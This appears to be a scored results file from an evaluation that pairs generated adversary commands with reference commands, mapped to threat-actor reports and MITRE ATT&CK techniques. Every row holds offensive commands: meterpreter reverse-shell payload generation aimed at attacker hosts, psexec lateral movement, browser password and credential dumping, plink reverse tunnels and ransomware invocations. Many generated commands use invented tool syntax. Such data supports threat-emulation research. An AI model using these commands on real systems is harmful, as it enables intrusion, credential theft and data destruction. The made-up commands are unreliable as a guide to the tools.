+GIGAMON2_FIN7,command_adfind_TA0005_T1112.txt,adfind,"adfind -b <domain> -f ""(|(sAMAccountType=805306144)(|msDS-User-Account-Control-Computed:2))"" -dn <target_user>",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"0,318",True
+GIGAMON2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+GIGAMON2_FIN7,command_chrome_passwords_TA0009_T1005.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+GIGAMON2_FIN7,command_invoke_psimage_TA0003_T1546.txt,invoke psimage,Invoke-PSImage -Script .\shim.ps1 -Out .\shim.png -Image .\shield.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,779",True
+GIGAMON2_FIN7,command_psexec_TA0005_T1620.txt,psexec,"psexec \\target_machine -accepteula -nobanner -l -priority high cmd /c start /b ""path_to_dll"" /a /w","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,293",True
+GIGAMON2_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\<target_computer> -u Administrator -p <password> -s cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,329",True
+GIGAMON3_FIN7,command_plink_TA0011_T1071.txt,plink,plink -shareexists <dns_tunnel_session>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,447",True
+GIGAMON3_FIN7,command_rubeus_TA0005_T1027.txt,rubeus,rubeus asktgs /ticket:<base64(ticket.kirbi)> /enc:aes256,`rubeus.exe kerberoast /domain:oz.local`,"0,312",True
+GRIZZLY_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script { Get-Content -Path <file_path> -ErrorAction SilentlyContinue },`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,458",True
+GRIZZLY_APT29,command_psexec_TA0002_T1204.txt,psexec,psexec -l <user_name> <target_system>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,225",True
+GRIZZLY_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -u <username> -p <password> cmd /c powershell.exe -ExecutionPolicy Bypass -File <ransomware_dll_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,319",True
+InsideTheBreach_FIN6,command_chrome_passwords_TA0000_T1056.txt,chrome passwords,chrome --password-store=browser --capture-form-data <form_data_file_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,277",True
+INTEZER_OILRIG,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+KASPERKY1_FIN7,command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,404",True
+KASPERKY1_FIN7,command_metasploit_TA0002_T1203.txt,metasploit,"msfconsole -x ""use exploit/windows/fileformat/ms03_026"" -x ""set payload windows/meterpreter/reverse_tcp"" -x ""set RHOST <target_ip>"" -x ""set RPORT 445"" -x ""exploit""","```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```","0,524",True
+KASPERKY1_FIN7,command_metasploit_TA0011_T1105.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp <initial_downloader Payload> LHOST=<attacker_ip> LPORT=<attacker_port>,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,652",True
+KASPERKY2_FIN7,command_adfind_TA0007_T1082.txt,adfind,"adfind -b <domain_name> -f ""(&(objectCategory=Computer)(operatingSystem=*))"" -r",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"0,576",True
+KASPERKY2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+KASPERKY2_FIN7,command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Invoke-PSImage -Script .\GRIFFON_Implant_Installer.ps1 -Out <installer_payload.png> -Image <existing_image.jpg> -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,591",True
+KASPERKY2_FIN7,command_paexec_TA0007_T1016.txt,paexec,PAExec @computers.txt -u <domain_admin> -p <password> -i -c ipconfig /all," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,456",True
+KASPERKY2_FIN7,command_pupy_TA0001_T1078.txt,pupy,run loot_memory browser_process_id,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,25",True
+KASPERKY2_FIN7,command_pupy_TA0003_T1078.txt,pupy,run hashmon /path/to/process/memory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,23",True
+KASPERKY2_FIN7,command_pupy_TA0004_T1078.txt,pupy,loot_memory --browser=browser_name,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,321",True
+KASPERKY2_FIN7,command_pupy_TA0005_T1078.txt,pupy,run Lazagne,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,135",True
+KASPERKY2_FIN7,command_ryuk_TA0003_T1547.txt,ryuk,"ryuk -e --process-name ""GRIFFON"" --drop-bat-files",`ryuk.exe --encrypt --process-name notepad.exe`,"0,521",True
+KASPERKY2_FIN7,command_ryuk_TA0004_T1547.txt,ryuk,ryuk.exe --process-name <process_name> -e,`ryuk.exe --encrypt --process-name notepad.exe`,"0,614",True
+KASPERKY2_FIN7,command_wmic_TA0002_T1047.txt,wmic,"wmic process call create ""notepad.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,588",True
+KASPERKY3_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+KASPERKY3_FIN7,command_chrome_passwords_TA0011_T1105.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+KASPERKY3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,invoke-psimage -d -i <existing_image_file> -o <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,362",True
+KASPERKY3_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-antispoof -batch <attacker_sql_user>@<sql_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,482",True
+KASPERSKY1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_database>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,336",True
+KASPERSKY2_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,msfconsole -r exploit.rb,`sudo msfconsole`,"0,488",True
+KASPERSKY2_CARBANAK,command_psexec_TA0001_T1078.txt,psexec,psexec \-u <domain>\user2 \-p <password> -i 0 \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,386",True
+KASPERSKY2_CARBANAK,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\user1 -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,311",True
+KASPERSKY2_CARBANAK,command_pupy_TA0004_T1055.txt,pupy,download C:\\Windows\\System32\\svchost.exe,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,321",True
+KASPERSKY2_CARBANAK,command_pupy_TA0004_T1134.txt,pupy,privesc_checker -s <os_type> -f <file_path>,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,214",True
+KASPERSKY2_CARBANAK,command_pupy_TA0005_T1055.txt,pupy,run memory_exec C:\\Windows\\System32\\svchost.exe privilege::debug,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,276",True
+KASPERSKY2_CARBANAK,command_pupy_TA0005_T1070.txt,pupy,pupy find /path/to/directory/ -type f -exec rm {} \;,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,252",True
+KASPERSKY2_CARBANAK,command_pupy_TA0005_T1134.txt,pupy,getsystem <windows_system_privilege>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,252",True
+MAGECART_FIN6,command_chrome_passwords_TA0011_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+MAGECART_FIN6,command_metasploit_TA0001_T1190.txt,metasploit,msfvenom -p windows/x86/shell_reverse_tcp LHOST=192.168.1.123 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"0,561",True
+MappingMitreToSandwormAPT_SANDWORM,command_chrome_passwords_TA0006_T1552.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0005_T1070.txt,ryuk,ryuk.exe --stop-services,`ryuk.exe --encrypt --process-name notepad.exe`,"0,451",True
+MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0011_T1001.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,63",True
+MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0040_T1490.txt,ryuk,ryuk.exe /delete-backups,`ryuk.exe --encrypt --process-name notepad.exe`,"0,394",True
+MappingMitreToSandwormAPT_SANDWORM,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
+wce.exe -w
+```","0,462",True
+MAZE_FIN6,command_psexec_TA0003_T1078.txt,psexec,psexec -u <domain_admin_account> -p <password> \\remote_system -s,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,336",True
+MICROSOFT_APT29,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+MICROSOFT_APT29,command_paexec_TA0011_T1219.txt,paexec,paexec -h -i -c <dll_name>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,226",True
+MICROSOFT_APT29,command_plink_TA0011_T1071.txt,plink,"plink.exe -i ""<private_key_file>"" <attacker_ssh_user>@<server_ip> -R 80:localhost:80","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,649",True
+MICROSOFT_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -s -nobanner -accepteula -c <file_path>\cyzfc.dat,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,23",True
+MoreEggs_FIN6,command_adfind_TA0043_T1589.txt,adfind,adfind -sc adinfo -binary,"adfind -f ""(objectcategory=group)""`","0,433",True
+MoreEggs_FIN6,command_windows_credential_editor_TA0002_T1059.txt,windows credential editor,wce -l,"```sh
+wce.exe -w
+```","0,385",True
+MORPHISEC_FIN6,command_metasploit_TA0004_T1055.txt,metasploit,msfpayload -p windows/meterpreter/reverse_tcp_lport=<lport> -e base64 -i encode_final_payload,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"0,485",True
+MORPHISEC_FIN6,command_metasploit_TA0005_T1055.txt,metasploit,"msfpayload windows/shell/reverse_tcp -f powershell -X 32 -c ""encode_final_payload"" -o remove_comspec -p <shellcode>",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,351",True
+MORPHISEC_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,use auxiliary/scanner/telnet/lantronix_telnet_password,"```sh
+msf> use auxiliary/admin/smb/psexec_ntdsgrab
+```","0,37",True
+MORPHISEC_FIN6,command_plink_TA0008_T1021.txt,plink,plink.exe -i key attacker_ssh_user@remote_server -R 22:localhost:22,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,595",True
+MORPHISEC_FIN6,command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe klist /purge,`rubeus.exe kerberoast /domain:oz.local`,"0,508",True
+MORPHISEC_FIN6,command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe purge /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,"0,469",True
+MORPHISEC_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic /RECORD:C:\temp\wmi_record.xml; wmic process call ""winmgmt start""; wmic netuse create ""C:\temp\script.ps1""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,4",True
+MORPHISEC_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,519",True
+MORPHISEC_FIN7,command_psexec_TA0002_T1053.txt,psexec,"psexec \\%computername% -u <user> -n s -a n,n,... cmd /c powershell -file <powershell_script_file_path>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,281",True
+MORPHISEC_FIN7,command_psexec_TA0003_T1053.txt,psexec,"psexec \\<victim_computer> -u <user_name> -c -a 1,2 cmd /c powershell.exe -File <powershell_script_path>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,31",True
+MORPHISEC_FIN7,command_psexec_TA0004_T1053.txt,psexec,"psexec \\<target_computer> -u <user_name> -n <timeout> -l -c -a <cpu_cores> cmd /c ""powershell -ExecutionPolicy Bypass -File <script_path>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,281",True
+MORPHISEC_FIN7,command_pupy_TA0004_T1055.txt,pupy,download 'C:\\Windows\\System32\\calc.exe',"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,324",True
+MYSTERY_APT29,command_psexec_TA0002_T1059.txt,psexec,psexec \\target_system -u <username> -p <password> taskkill /f /im <process_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,339",True
+NotPetya_SANDWORM,command_ryuk_TA0040_T1485.txt,ryuk,ryuk.exe --encrypt-files <file_pattern>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,605",True
+OlympicDestroyer_SANDWORM,command_adfind_TA0007_T1012.txt,adfind,"adfind -f ""HKLM\\SOFTWARE""","adfind -f ""(objectcategory=group)""`","0,393",True
+OlympicDestroyer_SANDWORM,command_paexec_TA0007_T1046.txt,paexec,"paexec -s -u <username> -p <password> \\remote_host ""services.msc"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,392",True
+OlympicDestroyer_SANDWORM,command_plink_TA0007_T1018.txt,plink,plink.exe -ssh <attacker_ssh_user>@*,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,511",True
+OlympicDestroyer_SANDWORM,command_plink_TA0008_T1021.txt,plink,plink login.example.com -l attacker_username,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,372",True
+OlympicDestroyer_SANDWORM,command_psexec_TA0002_T1059.txt,psexec,psexec.exe -accepteula -nobanner -i -e <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,35",True
+OlympicDestroyer_SANDWORM,command_psexec_TA0040_T1489.txt,psexec,"psexec \\target-system -s -u SYSTEM -d -wait -accepteula cmd /c ""taskkill /im <service_name>.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,273",True
+OlympicDestroyer_SANDWORM,command_ryuk_TA0005_T1027.txt,ryuk,ryuk.exe --obfuscate --files <file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,506",True
+OlympicDestroyer_SANDWORM,command_ryuk_TA0006_T1003.txt,ryuk,ryuk.exe --dump-credentials,`ryuk.exe --encrypt --process-name notepad.exe`,"0,432",True
+OlympicDestroyer_SANDWORM,command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_Process call Create ""cmd /c calc.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,496",True
+PICK_FIN6,command_adfind_TA0007_T1016.txt,adfind,adfind -sc fo:<object_name>,"adfind -f ""(objectcategory=group)""`","0,548",True
+PICK_FIN6,command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+PICK_FIN6,command_chrome_passwords_TA0007_T1087.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+PICK_FIN6,command_metasploit_TA0001_T1190.txt,metasploit,"msfconsole -x ""use exploit/multi/http/... ; set RHOST 192.168.0.4 ; set RPORT 80 ; set PAYLOAD windows/meterpreter/reverse_tcp ; run""",[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,45",True
+PICK_FIN6,command_metasploit_TA0003_T1543.txt,metasploit,"meterpreter > reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows"" /v ""RandomServiceName"" /t REG_SZ /d ""<random_service_name>""",[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"0,351",True
+PICK_FIN6,command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/powershell_service; set PAYLOAD windows/powershell_reverse_tcp; set LHOST <attacker_IP>; set LPORT <attacker_port>; exploit""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,493",True
+PICK_FIN6,command_metasploit_TA0005_T1027.txt,metasploit,msf6 > use exploit/http/foscam_rce,`msf> loot -t screenspy.screenshot`,"0,406",True
+PICK_FIN6,command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload windows http/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,585",True
+PICK_FIN6,command_paexec_TA0002_T1569.txt,paexec,PAExec \\<target_server> -u <username> -p <password> -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,418",True
+PICK_FIN6,command_paexec_TA0005_T1036.txt,paexec,paexec -i -s mstdc," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,212",True
+PICK_FIN6,command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -h -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,361",True
+PICK_FIN6,command_psexec_TA0001_T1078.txt,psexec,psexec -i \\<remote_system> -u <attacker_username> -p <attacker_password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,342",True
+POSH_APT29,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+POSH_APT29,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+POSH_APT29,command_chrome_passwords_TA0011_T1573.txt,chrome passwords,chrome-passwords -p <url> -u <username> -c <blob_column_name>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,305",True
+POSH_APT29,command_paexec_TA0011_T1105.txt,paexec,"paexec -c ""C:\Path\To\AdditionalCode.exe"" -lo C:\Temp\PAExec.log"," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,264",True
+POSH_APT29,command_rubeus_TA0002_T1106.txt,rubeus,rubeus.exe wmi create /class:<new_wmi_class_name> /prop:text=<property_name>:<property_value>,`rubeus.exe kerberoast /domain:oz.local`,"0,301",True
+POSH_APT29,command_rubeus_TA0003_T1546.txt,rubeus,"rubeus.exe wmiexec /smowmi /c:""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File <file_path>",`rubeus.exe kerberoast /domain:oz.local`,"0,308",True
+POSH_APT29,command_rubeus_TA0005_T1546.txt,rubeus,rubeus.exe wmienum /s:<wmi_event_subscription_name> /p:WMI_EVENT_SUBSCRIPTION_PASSWORD /t:WMI_EVENT_SUBSCRIPTION_TARGET,`rubeus.exe kerberoast /domain:oz.local`,"0,214",True
+POSH_APT29,command_ryuk_TA0005_T1036.txt,ryuk,"ryuk.exe -e --process-name ""<legitimate_process_name>""",`ryuk.exe --encrypt --process-name notepad.exe`,"0,634",True
+POSH_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic PATH win32_process CALL create ""C:\Windows\System32\svchost.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,421",True
+POWER_APT29,command_chrome_passwords_TA0042_T1566.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+POWER_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -ScriptBlock {Invoke-Mimikatz} -OutputFile <image_file_name>.png,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,503",True
+POWER_APT29,command_rubeus_TA0005_T1112.txt,rubeus,rubeus.exe reg add /key:HKCU\Software\Microsoft\Windows\CurrentVersion\Run /value:PowerDuke /type:string,`rubeus.exe kerberoast /domain:oz.local`,"0,333",True
+POWER_APT29,command_rubeus_TA0007_T1033.txt,rubeus,rubeus s4u /ptt /tgt <placeholder>,`rubeus.exe kerberoast /domain:oz.local`,"0,378",True
+POWER_APT29,command_rubeus_TA0007_T1083.txt,rubeus,rubeus ls <directory_path>,`rubeus.exe kerberoast /domain:oz.local`,"0,303",True
+POWER_APT29,command_windows_credential_editor_TA0001_T1059.txt,windows credential editor,wce.exe dump kerberos,"```sh
+wce.exe -w
+```","0,39",True
+POWER_APT29,command_windows_credential_editor_TA0002_T1059.txt,windows credential editor,wce -s <username>:<domain>:<ntlm_hash>:<password>,"```sh
+wce.exe -w
+```","0,174",True
+POWER_APT29,command_windows_credential_editor_TA0002_T1204.txt,windows credential editor,wce.exe -dump-kerb,"```sh
+wce.exe -w
+```","0,474",True
+RESEARCH_OILRIG,command_psexec_TA0002_T1053.txt,psexec,psexec \\\\<target_computer_name> -nobanner -accepteula -i cmd /c <file_path>\Client update.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,252",True
+RESEARCH_OILRIG,command_psexec_TA0003_T1053.txt,psexec,"psexec \\<target_system> -nobanner -accepteula -d -i cmd /c ""<path_to_Client_update.exe>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,281",True
+RESEARCH_OILRIG,command_psexec_TA0004_T1053.txt,psexec,"psexec \\<remote_system> cmd /c ""Client update.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,239",True
+RPT1_FIN6,command_adfind_TA0007_T1018.txt,adfind,"adfind -sc sl:msds* -b dc=<domain_name>,dc=net -f ""objectcategory=computer""","adfind -f ""(objectcategory=group)""`","0,527",True
+RPT1_FIN6,command_plink_TA0011_T1572.txt,plink,plink -sshlog <log_file> -L <listen_ip>:<listen_port>:<remote_host>:<remote_port>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,299",True
+SEA_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script .\upx.exe -Out .\evil-upx.png -Image .\kiwi.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,733",True
+SEA_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -ssh login.example.com,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,436",True
+SEA_APT29,command_pupy_TA0003_T1546.txt,pupy,pupwinutils/psexec.py -s -i cmd /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File <file_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,248",True
+SecurityIntelligence8_FIN6,command_metasploit_TA0002_T1072.txt,metasploit,"msfconsole -x ""use exploit/windows/meterpreter/reverse_tcp; set LHOST 192.168.0.4; set LPORT 3389; set PAYLOAD windows/meterpreter/reverse_tcp; run""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,521",True
+SecurityIntelligence8_FIN6,command_metasploit_TA0008_T1072.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 -f exe -o <file_name>.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"0,724",True
+SecurityIntelligence8_FIN6,command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,459",True
+SecurityIntelligence8_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_Process Call Create ""powershell.exe -command <powershell_command>""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,43",True
+SENTINELONE_FIN7,command_adfind_TA0002_T1204.txt,adfind,adfind msDS-ReplConnectionFailures,`adfind.exe -f (objectcategory=person) > ad_users.txt`,"0,409",True
+SENTINELONE_FIN7,command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=group)(|!(name=*Domain Group))"" -a dn","adfind -f ""(objectcategory=group)""`","0,613",True
+SENTINELONE_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
